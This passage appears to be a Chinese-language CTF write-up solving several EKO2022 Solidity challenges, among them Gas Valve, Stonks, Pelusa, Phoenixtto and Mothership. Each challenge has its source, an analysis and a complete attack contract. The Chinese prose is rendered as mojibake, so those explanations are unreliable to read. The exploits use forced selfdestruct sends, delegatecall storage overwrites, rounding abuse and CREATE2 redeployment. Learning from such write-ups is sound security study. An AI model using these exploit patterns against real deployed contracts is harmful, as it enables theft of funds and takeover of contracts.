–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–’â–’â–’â–“â–’â–‘â–‘â–‘â–’â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘*/ 2. analysis ç›®æ ‡æ˜¯æˆåŠŸæ‰§è¡Œkill()å‡½æ•°ï¼Œè€Œè¦æƒ³è°ƒç”¨æ­¤å‡½æ•°åªèƒ½é€šè¿‡destroyIt(string memory spell)å‡½æ•°ï¼Œåˆ†ædestroyIt()å‡½æ•° 1234567891011function destroyIt(string memory spell, uint256 magic) public &#123; bytes32 spellInBytes; assembly &#123; spellInBytes := mload(add(spell, 32)) &#125; require(spellInBytes == _spell, &quot;That spell wouldn&#x27;t kill a fly&quot;); require(!invincible, &quot;The Horrocrux is still invincible&quot;); bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic))); address(this).call(kedavra); &#125; æœ‰ä¸¤ä¸ªæ–­è¨€ï¼š æ–­è¨€ä¸€ï¼šå½¢å‚spellçš„å€¼ç­‰äº0x45746865724b6164616272610000000000000000000000000000000000000000ï¼Œè¿™ä¸ªå¯ä»¥åšåˆ°ï¼Œå› ä¸ºè¿™ä¸ªå€¼å¯ä»¥ç”± ASCIIç è¡¨ è½¬åŒ–è¿‡æ¥ï¼Œè½¬åŒ–ç»“æœå¦‚ä¸‹ï¼š 12//45 74 68 65 72 48 61 64 61 62 72 61 0000000000000000000000000000000000000000//EtherKadabra æ–­è¨€äºŒï¼šè°ƒç”¨ setInvincible()ï¼Œå°†invincibleä¿®æ”¹ä¸ºfalseã€‚è€Œåˆçº¦ä¸­æœ‰ 2weiï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡è§¦å‘fallbackå‡½æ•°ï¼Œå†é€šè¿‡selfdestructå¼ºåˆ¶ç»™åˆçº¦å‘é€ 1weiï¼Œä¸”ä¸ä¼šè§¦å‘å›è°ƒå‡½æ•°fallbackã€‚ ä½¿çš„kedavaçš„å€¼ç­‰äºkill.selectorï¼Œå¯ä»¥é€šè¿‡ç®€å•çš„è®¡ç®—å¾—åˆ°ï¼š 1234function cal() internal pure returns (uint magic) &#123; uint kill_selector = uint(bytes32(bytes4(abi.encodeWithSignature(&quot;kill()&quot;)))); magic = uint(_spell) - kill_selector;&#125; *è¿™é‡Œæœ‰ä¸ªå°é™·é˜±ï¼Œå°±æ˜¯éœ€è¦å°†byte4è½¬åŒ–ä¸€æ¬¡byte32ï¼Œåªæœ‰è¿™æ ·bytes4(abi.encodeWithSignature(&quot;kill()&quot;))æ‰ä¼šå é«˜ä½ï¼Œå¦‚ä¸‹æ‰€ç¤º 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930contract SmartHorrocruxHacker &#123; SmartHorrocrux samrthorrocrux; bytes32 private constant _spell = 0x45746865724b6164616272610000000000000000000000000000000000000000; constructor(address _samrthorrocrux) &#123; samrthorrocrux = SmartHorrocrux(_samrthorrocrux); &#125; function attack() public payable &#123; address(samrthorrocrux).call(&quot;&quot;); // tigger fallback() new Helper().kill&#123;value:1&#125;(payable(address(samrthorrocrux))); samrthorrocrux.setInvincible(); // lead to invincible = false samrthorrocrux.destroyIt(&quot;EtherKadabra&quot;, cal()); require(!samrthorrocrux.alive(), &quot;It isn&#x27;t dead...&quot;); &#125; function cal() internal pure returns (uint magic) &#123; uint kill_selector = uint(bytes32(bytes4(abi.encodeWithSignature(&quot;kill()&quot;)))); magic = uint(_spell) - kill_selector; &#125;&#125;contract Helper &#123; function kill(address payable to) public payable &#123; require(msg.value == 1 wei); selfdestruct(to); &#125;&#125; Gas Valve1.question The evil Dr. N. Gas has put into orbit a machine that can suck all the air out of the atmosphere. You sneaked into his spaceship and must find a nozzle to open the main valve and stop the machine! Assert the situation and donâ€™t panic. Hint: on the valve is marked â€œmodel no. EIP-150â€ æºç  1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity 0.8.17;interface INozzle &#123; function insert() external returns (bool);&#125;/// @title Gas Valve/// @author https://twitter.com/bahurum/// @notice The evil Dr. N. Gas has created a machine to suck all the air out of the atmosphere. Anon, you must deactivate it before it&#x27;s too late!/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/gas-valvecontract Valve &#123; bool public open; bool public lastResult; function useNozzle(INozzle nozzle) public returns (bool) &#123; try nozzle.insert() returns (bool result) &#123; lastResult = result; return result; &#125; catch &#123; lastResult = false; return false; &#125; &#125; function openValve(INozzle nozzle) external &#123; open = true; (bool success,) = address(this).call(abi.encodeWithSelector(this.useNozzle.selector, nozzle)); require(!success); &#125;&#125; 2. analysis è¿™é¢˜è¦æ±‚æˆåŠŸè°ƒç”¨openValve(INozzle nozzle)å‡½æ•°ï¼ŒæˆåŠŸè°ƒç”¨çš„å‰ææ˜¯è°ƒç”¨useNozzle(INozzle nozzle)å¤±è´¥ï¼Œè€Œåœ¨useNozzle(INozzle nozzle)å‡½æ•°ä¸­æœ‰try...catchå¤„ç†è¯­å¥ï¼Œç”¨æ¥å¤„ç†nozzle.insert()ã€‚å°è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥å¤„ç†require, revertç­‰ çœ‹é¢˜è§£æ‰çŸ¥é“ï¼Œä½¿ç”¨selfdestrct()å¯ä»¥ä½¿å¾—å‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œä½†æ˜¯è¯¥å¤±è´¥ä¸ä¼šè¢«try catchæ•è·ã€‚ 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718contract GasValueHacker is INozzle &#123; Valve value; constructor(address _value) &#123; value = Valve(_value); &#125; function attack() public &#123; value.openValve(INozzle(address(this))); require(value.open(), &quot;you are not open...&quot;); &#125; function insert() external returns (bool) &#123; selfdestruct(payable(address(this))); &#125;&#125; Stonks1.question You have infiltrated in a big investment firm (name says something about arrows), your task is to loose all their money. æºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/// @title Stonks/// @author https://twitter.com/eugenioclrc/// @notice You have infiltrated in a big investment firm (name says something about arrows), your task is to loose all their money/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/stonkscontract Stonks &#123; mapping(address =&gt; mapping(uint256 =&gt; uint256)) private _balances; // stock tickers uint256 public constant TSLA = 0; uint256 public constant GME = 1; ///@dev price oracle 1 TSLA stonk is 50 GME stonks uint256 public constant ORACLE_TSLA_GME = 50; constructor(address _player) &#123; ///@dev the trader starts with 200 TSLA shares &amp; 1000 GME shares _balances[_player][TSLA] = 20; _balances[_player][GME] = 1_000; &#125; /// @notice Buy TSLA stonks using GME stonks /// @param amountGMEin amount of GME to spend /// @param amountTSLAout amount of TSLA to buy function buyTSLA(uint256 amountGMEin, uint256 amountTSLAout) external &#123; require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, &quot;Invalid price&quot;); _balances[msg.sender][GME] -= amountGMEin; _balances[msg.sender][TSLA] += amountTSLAout; &#125; /// @notice Sell TSLA stonks for GME stonks /// @param amountTSLAin amount of GME to spend /// @param amountGMEout amount of TSLA to buy function sellTSLA(uint256 amountTSLAin, uint256 amountGMEout) external &#123; require(amountTSLAin * ORACLE_TSLA_GME == amountGMEout, &quot;Invalid price&quot;); _balances[msg.sender][TSLA] -= amountTSLAin; _balances[msg.sender][GME] += amountGMEout; &#125; function balanceOf(address _owner, uint256 _ticker) external view returns (uint256) &#123; return _balances[_owner][_ticker]; &#125;&#125; 2. analysis åªè¦çŸ¥é“åœ¨solidityä¸­æ²¡æœ‰å››èˆäº”å…¥ï¼Œå°æ•°ç‚¹éƒ½æ˜¯é‡‡ç”¨ç›´æ¥æŠ¹é™¤å³å‘ä¸‹å–æ•´çš„æ–¹å¼å¤„ç†å°æ•°çš„ï¼Œè¿™é“é¢˜å°±å¾ˆå¥½è§£ï¼Œåˆ©ç”¨å¥½require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, &quot;Invalid price&quot;);ä¸­çš„é™¤æ³•è¿ç®—å³å¯ã€‚40 &#x2F; 50 &#x3D; 0 3. solveæ”»å‡»åˆçº¦ æ”»å‡»é€»è¾‘ï¼šå…ˆéƒ¨ç½²hackerï¼Œå°†hackerè®¾ç½®ä¸ºplayerï¼Œå°†stonksåœ°å€ä¼ å…¥hackerçš„attackå‡½æ•°ä¸­ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°å³å¯å®Œæˆæ”»å‡»ã€‚ 12345678910111213141516contract StonksHacker &#123; Stonks stonks; function attack(address _stonks) public &#123; stonks = Stonks(_stonks); stonks.sellTSLA(20, 1000); // let TSLA swap GAM for (uint i; i &lt; 2000 / 40; i++) &#123; stonks.buyTSLA(40, 0); &#125; require(stonks.balanceOf(address(this), 0) == 0, &quot;TSLA is not zero&quot;); require(stonks.balanceOf(address(this), 1) == 0, &quot;GAM is not zero&quot;); &#125;&#125; Pelusa1.question You just open your eyes and are in Mexico 1986, help Diego to set the score from 1 to 2 goals for a win, do whatever is necessary! æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// SPDX-License-Identifier: MITpragma solidity ^0.8.7;interface IGame &#123; function getBallPossesion() external view returns (address);&#125;// &quot;el baile de la gambeta&quot;// https://www.youtube.com/watch?v=qzxn85zX2aE/// @title Pelusa/// @author https://twitter.com/eugenioclrc/// @notice Its 1986, you are in the football world cup (Mexico86), help Diego score a goal./// @custom:url https://www.ctfprotocol.com/tracks/eko2022/pelusacontract Pelusa &#123; address private immutable owner; address internal player; uint256 public goals = 1; constructor() &#123; owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number)))))); &#125; function passTheBall() external &#123; require(msg.sender.code.length == 0, &quot;Only EOA players&quot;); /// @dev &quot;la pelota siempre al 10&quot; require(uint256(uint160(msg.sender)) % 100 == 10, &quot;not allowed&quot;); player = msg.sender; &#125; function isGoal() public view returns (bool) &#123; // expect ball in owners posession return IGame(player).getBallPossesion() == owner; &#125; function shoot() external &#123; require(isGoal(), &quot;missed&quot;); /// @dev use &quot;the hand of god&quot; trick (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;)); require(success, &quot;missed&quot;); require(uint256(bytes32(data)) == 22_06_1986); &#125;&#125; 2. analysis ç›®æ ‡æ˜¯å°†goalsçš„å€¼ä¿®æ”¹ä¸º2ï¼Œå”¯ä¸€çš„åŠæ³•å°±åªèƒ½é€šè¿‡delegatecallè¿›è¡Œå†…å­˜è¦†ç›–æ¥å®ç°ï¼Œä¸è¿‡è¦æ³¨æ„çš„æ˜¯immutableä¿®é¥°çš„å˜é‡ä¸å slotï¼Œæ‰€ä»¥goalsåœ¨åˆçº¦ä¸­çš„ä½ç½®æ˜¯slot1ã€‚ åˆ†æshoot() 123456789101112function shoot() external &#123; require(isGoal(), &quot;missed&quot;); // getStorage() /// @dev use &quot;the hand of god&quot; trick (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;)); require(success, &quot;missed&quot;); require(uint256(bytes32(data)) == 22_06_1986);&#125;function isGoal() public view returns (bool) &#123; // expect ball in owners posession return IGame(player).getBallPossesion() == owner;&#125; ownerï¼šè¯¥å€¼å¯ä»¥é€šè¿‡åˆçº¦åœ°å€ï¼Œæ‰¾åˆ°å½“æ—¶çš„éƒ¨ç½²è€…ä¹Ÿå°±æ˜¯msg.senderï¼Œç”±äºblockhash(block.number)&#x3D; 0ï¼Œæ‰€ä»¥ owner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, bytes32(uint(0))))))) handOfGod()ï¼šè‡ªå®šä¹‰è¯¥å‡½æ•°ï¼Œä»¤å…¶è¿”å›å€¼ä¸º22_06_1986 æ­¤å¤–è¿˜å¾—é€šè¿‡passTheBall()å°†playerè®¾ç½®ä¸ºhackerï¼Œå½“ç„¶ï¼Œé€šè¿‡create2å¯ä»¥è½»æ¾é€šè¿‡é™åˆ¶æ¡ä»¶ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435contract PelusaHacker is IGame &#123; address private owner; uint256 public goals = 1; // slo Pelusa pelusa; constructor(address _pelusa) &#123; pelusa = Pelusa(_pelusa); pelusa.passTheBall(); // CREATE2 &#125; function attack(address deployer) public &#123; owner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, bytes32(uint(0))))))); pelusa.shoot(); &#125; function handOfGod() public returns(uint) &#123; goals = 2; return 22_06_1986; &#125; function getBallPossesion() external view returns (address) &#123; return owner; &#125;&#125;contract Deployer &#123; function deploy(uint salt, address pelusa) public returns(address) &#123; bytes32 _salt = keccak256(abi.encodePacked(salt)); return address(new PelusaHacker&#123;salt: _salt&#125;(pelusa)); &#125;&#125; Phoenixtto1.question Within the world of crossovers there is a special one, where the universes of pokemon, harry potter and solidity intertwine. In this crossover a mixed creature is created between dumbledoreâ€™s phoenix, a wild ditto and since we are in the solidity universe this creature is a contract. We have called it Phoenixtto and it has two important abilities, that of being reborn from itâ€™s ashes after its destruction and that of copying the behavior of another bytecode.Try to capture the Phoenixtto, if you canâ€¦ æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// SPDX-License-Identifier: MITpragma solidity 0.8.17;/** * @title Phoenixtto * @author Rotcivegaf https://twitter.com/victor93389091 &lt;victorfage@gmail.com&gt; * @dev Within the world of crossovers there is a special one, where the universes of pokemon, * harry potter and solidity intertwine. * In this crossover a mix creature is created between dumbledore&#x27;s phoenix, a wild ditto and * since we are in the solidity universe this creature is a contract. * We have called it Phoenixtto and it has two important abilities, that of being reborn from * it&#x27;s ashes after its destruction and that of copying the behavior of another bytecode * Try to capture the Phoenixtto, if you can... * @custom:url https://www.ctfprotocol.com/tracks/eko2022/phoenixtto */contract Laboratory &#123; address immutable PLAYER; address public getImplementation; address public addr; constructor(address _player) &#123; PLAYER = _player; &#125; function mergePhoenixDitto() public &#123; reBorn(type(Phoenixtto).creationCode); &#125; function reBorn(bytes memory _code) public &#123; address x; assembly &#123; x := create(0, add(0x20, _code), mload(_code)) &#125; getImplementation = x; _code = hex&quot;5860208158601c335a63aaf10f428752fa158151803b80938091923cf3&quot;; assembly &#123; x := create2(0, add(_code, 0x20), mload(_code), 0) &#125; addr = x; Phoenixtto(x).reBorn(); &#125; function isCaught() external view returns (bool) &#123; return Phoenixtto(addr).owner() == PLAYER; &#125;&#125;contract Phoenixtto &#123; address public owner; bool private _isBorn; function reBorn() external &#123; if (_isBorn) return; _isBorn = true; owner = address(this); &#125; function capture(string memory _newOwner) external &#123; if (!_isBorn || msg.sender != tx.origin) return; address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner))))); if (newOwner == msg.sender) &#123; owner = newOwner; &#125; else &#123; selfdestruct(payable(msg.sender)); _isBorn = false; &#125; &#125;&#125; 2. analysis æˆ‘è®¤ä¸ºæœ€ä¸»è¦æ˜¯è€ƒå¯Ÿhex&quot;5860208158601c335a63aaf10f428752fa158151803b80938091923cf3&quot;ï¼Œåˆ©ç”¨getImplementationçš„è¿è¡Œä»£ç ï¼Œæ‰§è¡Œcreate2æŒ‡ä»¤ï¼Œæœ€åè·å–ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€å’Œç¬¬ä¸€æ¬¡è°ƒç”¨reBorn()æ—¶ç”Ÿæˆçš„addræ˜¯ç›¸åŒçš„ï¼ŒæœŸé—´æ— è®ºå¦‚ä½•ä¿®æ”¹å½¢å‚_codeçš„å€¼ï¼Œaddrçš„å€¼éƒ½æ˜¯åŒä¸€ä¸ªï¼Œä½†æ˜¯é‡ç‚¹æ¥äº†ï¼Œæ­¤æ—¶éƒ¨ç½²å‡ºæ¥çš„addrçš„åˆçº¦åŠŸèƒ½å–å†³äºå½¢å‚_codeï¼Œè¿™æ„å‘³ç€åœ°å€è¿˜æ˜¯é‚£ä¸ªåœ°å€ï¼Œä½†æ˜¯å†…éƒ¨çš„ä»£ç å´å¤§å˜æ ·äº†ï¼Œè¿™ä¸ªçœŸçš„å¾ˆç¦»è°±ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦çš„æˆ‘å¤§ä¸ºéœ‡æƒŠã€‚ æ‰€ä»¥è¯´ï¼Œåªè¦é‡æ–°é€šè¿‡è°ƒç”¨reBornå‡½æ•°ï¼Œå¹¶ä¼ å…¥æŒ‡å®šçš„bytecodeï¼Œè¢«create2ç”Ÿæˆå‡ºæ¥çš„addrï¼Œåˆ™ä¼šå…·å¤‡æˆ‘æŒ‡å®šçš„åŠŸèƒ½(ç”±æˆ‘ä¼ å…¥çš„bytecodeå†³å®š)ï¼Œä½†æ˜¯åœ¨è°ƒç”¨reBornå‡½æ•°ä¹‹å‰ï¼Œéœ€è¦å°†ä¹‹å‰éƒ¨ç½²çš„addrç»™killæ‰ã€‚è€Œcaptureå‡½æ•°åˆ™æä¾›äº†å¯è¡Œæ€§ï¼Œä½†æ˜¯æœ‰ä¸ªif (!_isBorn || msg.sender != tx.origin) return;é™åˆ¶æ¡ä»¶ï¼Œç®€å•ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å»æ¯æ‰addråˆçº¦ã€‚ å½“ç„¶ï¼Œè¿™é¢˜å¥½åƒè¿˜æœ‰ä¸€ç§è§£å†³åŠæ³•ï¼Œå°±æ˜¯é€šè¿‡captureå‡½æ•°è¿›è¡Œæ•è·ï¼Œaddress newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))))è¿™å¾ˆæ˜æ˜¾å°±æ˜¯publickey&#x3D;&gt;addressçš„è®¡ç®—å¼ï¼Œæ‰€ä»¥åªè¦å°†playerçš„publickeyä¼ å…¥å³å¯captureå®ƒï¼Œä½†æ˜¯ï¼Œå½¢å‚æ˜¯stringç±»å‹çš„ï¼Œå…¬é’¥æ˜¯bytes32ç±»å‹çš„ï¼Œæˆ‘ä¸çŸ¥é“å’‹è½¬ï¼Œè¿™ä¸ªæ€è·¯å°±å…ˆæç½®äº†ã€‚ 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122contract PhoenixttoHacker &#123; Laboratory laboratory; constructor(address _laboratory) &#123; laboratory = Laboratory(_laboratory); &#125; function attack() public &#123; laboratory.reBorn(type(PhoenixttoHelper).creationCode); require(laboratory.isCaught(), &quot;You don&#x27;t catch it...&quot;); &#125;&#125;contract PhoenixttoHelper &#123; address public owner; function reBorn() public &#123; owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; // player&#x27;address &#125;&#125; Mothership1.question You and a small group of scientists have been working on a global counteroffensive against the invader.Weâ€™ve recovered some of the shipâ€™s source code and need to find a way to hack it!You have already studied the code and realized that to survive you need to take control of the Mothership.Your objective is to hack the Mothership instance (change the hacked bool to true).Good luck, the earthâ€™s future depends on you! æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title Hack the Mothership/// @author https://twitter.com/nicobevi_eth/// @notice A big alien float is near the Earth! You and an anon group of scientists have been working on a global counteroffensive against the invader. Hack the Mothership, save the earth/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hack-the-mothershipcontract Mothership &#123; address public leader; SpaceShip[] public fleet; mapping(address =&gt; SpaceShip) public captainRegisteredShip; bool public hacked; constructor() &#123; leader = msg.sender; address[5] memory captains = [ 0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004, 0x0000000000000000000000000000000000000005 ]; // Adding standard modules address cleaningModuleAddress = address(new CleaningModule()); address refuelModuleAddress = address(new RefuelModule()); address leadershipModuleAddress = address(new LeadershipModule()); for (uint8 i = 0; i &lt; 5; i++) &#123; SpaceShip _spaceship = new SpaceShip( captains[i], address(this), cleaningModuleAddress, refuelModuleAddress, leadershipModuleAddress ); fleet.push(_spaceship); captainRegisteredShip[captains[i]] = _spaceship; &#125; &#125; function addSpaceShipToFleet(SpaceShip spaceship) external &#123; require(leader == msg.sender, &quot;You are not our leader&quot;); fleet.push(spaceship); captainRegisteredShip[spaceship.captain()] = spaceship; &#125; function _isFleetMember(SpaceShip spaceship) private view returns (bool isFleetMember) &#123; uint8 len = uint8(fleet.length); for (uint8 i; i &lt; len; ++i) &#123; if (address(fleet[i]) == address(spaceship)) &#123; isFleetMember = true; break; &#125; &#125; &#125; /** * A new captain will be promoted if: * 1. Ship is part of the fleet * 2. Ship has no captain * 3. The new captain is not a captain already */ function assignNewCaptainToShip(address _newCaptain) external &#123; SpaceShip spaceship = SpaceShip(msg.sender); require(_isFleetMember(spaceship), &quot;You&#x27;re not part of the fleet&quot;); require(spaceship.captain() == address(0), &quot;Ship has a captain&quot;); require(address(captainRegisteredShip[_newCaptain]) == address(0), &quot;You&#x27;re a captain already&quot;); // register ship to captain captainRegisteredShip[_newCaptain] = spaceship; // Communicate that new captain has been approved to ship spaceship.newCaptainPromoted(_newCaptain); &#125; /** * A captain will be assigned as leader of the fleet if: * 1. The proposed leader is a spaceship captain * 2. All the other ships approve the promotion */ function promoteToLeader(address _leader) external &#123; SpaceShip leaderSpaceship = captainRegisteredShip[_leader]; // should have a registered ship require(address(leaderSpaceship) != address(0), &quot;is not a captain&quot;); // should be approved by other captains uint8 len = uint8(fleet.length); for (uint8 i; i &lt; len; ++i) &#123; SpaceShip spaceship = fleet[i]; // ignore captain ship if (address(spaceship) == address(leaderSpaceship)) &#123; continue; &#125; // should not revert if captain approves the new leader LeadershipModule(address(spaceship)).isLeaderApproved(_leader); &#125; // remove captain from his ship delete captainRegisteredShip[_leader]; leaderSpaceship.newCaptainPromoted(address(0)); leader = _leader; &#125; function hack() external &#123; require(leader == msg.sender, &quot;You are not our leader&quot;); hacked = true; &#125; function fleetLength() external view returns (uint256) &#123; return fleet.length; &#125; /** * ...the rest of the code is lost */&#125;contract SpaceShip &#123; address public captain; address[] public crew; Mothership public mothership; mapping(bytes4 =&gt; address) public modules; constructor( address _captain, address _mothership, address _cleaningModuleAddress, address _refuelModuleAddress, address _leadershipModuleAddress ) &#123; captain = _captain; mothership = Mothership(_mothership); // Adding standard modules modules[CleaningModule.replaceCleaningCompany.selector] = _cleaningModuleAddress; modules[RefuelModule.addAlternativeRefuelStationsCodes.selector] = _refuelModuleAddress; modules[LeadershipModule.isLeaderApproved.selector] = _leadershipModuleAddress; &#125; function _isCrewMember(address member) private view returns (bool isCrewMember) &#123; uint256 len = uint256(crew.length); for (uint256 i; i &lt; len; ++i) &#123; if (crew[i] == member) &#123; isCrewMember = true; break; &#125; &#125; &#125; function newCaptainPromoted(address _captain) external &#123; require(msg.sender == address(mothership), &quot;You are not our mother&quot;); captain = _captain; &#125; function askForNewCaptain(address _newCaptain) external &#123; require(_isCrewMember(msg.sender), &quot;Not part of the crew&quot;); require(captain == address(0), &quot;We have a captain already&quot;); mothership.assignNewCaptainToShip(_newCaptain); &#125; /** * This SpaceShip model has an advanced module system * Only the captain can upgrade the ship */ function addModule(bytes4 _moduleSig, address _moduleAddress) external &#123; require(msg.sender == captain, &quot;You are not our captain&quot;); modules[_moduleSig] = _moduleAddress; &#125; // solhint-disable-next-line no-complex-fallback fallback() external &#123; bytes4 sig4 = msg.sig; address module = modules[sig4]; require(module != address(0), &quot;invalid module&quot;); // call the module // solhint-disable-next-line avoid-low-level-calls (bool success,) = module.delegatecall(msg.data); if (!success) &#123; // return response error assembly &#123; returndatacopy(0, 0, returndatasize()) revert(0, returndatasize()) &#125; &#125; &#125;&#125;contract CleaningModule &#123; address private cleaningCompany; function replaceCleaningCompany(address _cleaningCompany) external &#123; cleaningCompany = _cleaningCompany; &#125; /** * ...the rest of the code is lost */&#125;contract RefuelModule &#123; uint256 private mainRefuelStation; uint256[] private alternativeRefuelStationsCodes; function addAlternativeRefuelStationsCodes(uint256 refuelStationCode) external &#123; alternativeRefuelStationsCodes.push(refuelStationCode); &#125; /** * ...the rest of the code is lost */&#125;contract LeadershipModule &#123; function isLeaderApproved(address) external pure &#123; revert(&quot;We don&#x27;t want a new leader :(&quot;); &#125; /** * ...the rest of the code is lost */&#125;/** * ...the rest of the code is lost */ 2. analysis è¿™é¢˜å¾ˆæœ‰æ„æ€ï¼Œè€ƒå¯Ÿäº†å¾ˆå¤šç‚¹ï¼š ä»”ç»†åˆ†æé¢˜ç›®ï¼šè¦æƒ³ä½¿hackedå˜æˆtrueï¼Œåªèƒ½é€šè¿‡hackå‡½æ•°ï¼Œè€Œè°ƒç”¨è¯¥å‡½æ•°çš„å‰ææ˜¯æˆä¸ºleaderï¼ŒpromoteToLeaderå‡½æ•°æä¾›äº†å¯è¡Œæ€§ï¼Œä½†æ˜¯éœ€è¦é€šè¿‡ä¸€ç³»åˆ—é™åˆ¶ï¼Œåˆ†æpromoteToLeaderå‡½æ•° 123456789101112131415161718192021222324function promoteToLeader(address _leader) external &#123; SpaceShip leaderSpaceship = captainRegisteredShip[_leader]; // should have a registered ship require(address(leaderSpaceship) != address(0), &quot;is not a captain&quot;); // should be approved by other captains uint8 len = uint8(fleet.length); for (uint8 i; i &lt; len; ++i) &#123; SpaceShip spaceship = fleet[i]; // ignore captain ship if (address(spaceship) == address(leaderSpaceship)) &#123; continue; &#125; // should not revert if captain approves the new leader LeadershipModule(address(spaceship)).isLeaderApproved(_leader); &#125; // remove captain from his ship delete captainRegisteredShip[_leader]; leaderSpaceship.newCaptainPromoted(address(0)); leader = _leader;&#125; é¦–å…ˆæ˜¯æ»¡è¶³captainRegisteredShip[_leader] != address(0)ï¼Œè¦æƒ³æ»¡è¶³è¯¥æ¡ä»¶åªèƒ½é€šè¿‡assignNewCaptainToShipå‡½æ•°ï¼Œåˆ†æassignNewCaptainToShipå‡½æ•°å¯çŸ¥ï¼Œç¬¬ä¸€å…³åˆ™æ˜¯æ»¡è¶³isFleetMember(SpaceShip(msg.sender))==trueï¼Œäºæ˜¯ä¹ï¼Œçœ‹åˆ°_isFleetMember(SpaceShip spaceship)å‡½æ•°ï¼Œåªæœ‰spaceshipè¢«åŠ å…¥åˆ°fleetä¸­æ‰èƒ½è¿”å›trueï¼Œè€Œmsg.senderæ˜¯æ²¡æœ‰è¢«åŠ å…¥åˆ°fleetä¸­çš„ï¼Œå”¯ä¸€çš„æ·»åŠ é€”å¾„æ˜¯é€šè¿‡addSpaceShipToFleetå‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°åªèƒ½ç”±leaderè°ƒç”¨ï¼Œæˆ‘ä»¬çš„åˆè¡·å°±æ˜¯æˆä¸ºleaderï¼Œæ‰€ä»¥è¯¥æ–¹æ³•ä¸å¯è¡Œã€‚ çœ‹åˆ°SpaceShipåˆçº¦ï¼ŒaskForNewCaptainå‡½æ•°ä¸­æœ‰è¿™æ ·ä¸€å¥ä»£ç mothership.assignNewCaptainToShip(_newCaptain);ï¼Œæ„å‘³ç€å¯ä»¥é€šè¿‡è¯¥å‡½æ•°è°ƒç”¨MotherShipä¸­çš„assignNewCaptainToShipï¼Œå› ä¸ºè¯¥spaceshipå¯ä»¥ä»å…¬å¼€çš„fleetä¸­è·å–å…¶åœ°å€ï¼Œä»è€Œè¿›è¡Œæ“ä½œã€‚ è¦æƒ³æˆåŠŸè°ƒç”¨è¯¥å‡½æ•°ï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªé™åˆ¶æ¡ä»¶ï¼Œ*require(_isCrewMember(msg.sender), â€œNot part of the crewâ€); require(captain &#x3D;&#x3D; address(0), â€œWe have a captain alreadyâ€);è¿™é‡Œå¾ˆå·§å¦™çš„ï¼Œçœ‹åˆ°è¯¥åˆçº¦çš„å›è°ƒå‡½æ•°fallbackï¼Œå…¶å‡½æ•°çš„é€»è¾‘å’Œä»£ç†åˆçº¦ä¸­çš„å›è°ƒå‡½æ•°ç®€ç›´ä¸€æ¨¡ä¸€æ ·ï¼Œåªä¸è¿‡å®ƒåªèƒ½è°ƒç”¨æŸäº›é™å®šçš„å‡½æ•°ï¼Œä½†è¿™æ— æ‰€è°“äº†ï¼Œè¿™å‡ 